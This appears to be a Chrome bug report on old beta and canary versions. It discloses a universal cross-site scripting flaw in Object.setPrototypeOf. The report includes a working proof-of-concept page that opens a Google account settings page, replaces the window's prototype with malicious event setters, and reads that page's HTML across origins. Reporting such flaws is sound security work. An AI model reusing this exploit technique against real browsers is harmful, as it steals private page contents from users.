UserAgent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.60 Safari/537.36

Steps to reproduce the problem:

What is the expected behavior?

What went wrong?
The current implementation of Object.setPrototypeOf doesn't have any security checks.
To exploit this as a UXSS an attacker could replace the victim's window prototype with an object
which has default methods/property accessors redefined to leak an object from the victim's JS context.

Repro:
<script>
url = "https://www.google.com/settings/personalinfo?";

function alertBody(value) {
	alert(value.constructor("return document.body.innerHTML")());
}

protoObj = { };
for (var i in window.__proto__)
	if (i.indexOf("on") == 0) //redefine event handlers
		protoObj.__defineSetter__(i, alertBody);

function clickHandler()
{
	wnd = open(url);

	setInterval(function() {
		Object.setPrototypeOf(wnd, protoObj);
	}, 0);

	setInterval(function() {
		wnd.location = url + Math.random();
	}, 2000);
}
</script>
<button onclick="clickHandler()">Click me</button>

Affected versions:
Google Chrome	34.0.1847.60 (Официальная сборка 256359) beta-m
Google Chrome	35.0.1898.0 (Официальная сборка 257789) canary

Chrome stable doesn't have setPrototypeOf yet.

Did this work before? N/A 

Chrome version: 34.0.1847.60  Channel: beta
OS Version: 6.1 (Windows 7, Windows Server 2008 R2)
Flash Version: Shockwave Flash 13.0 r0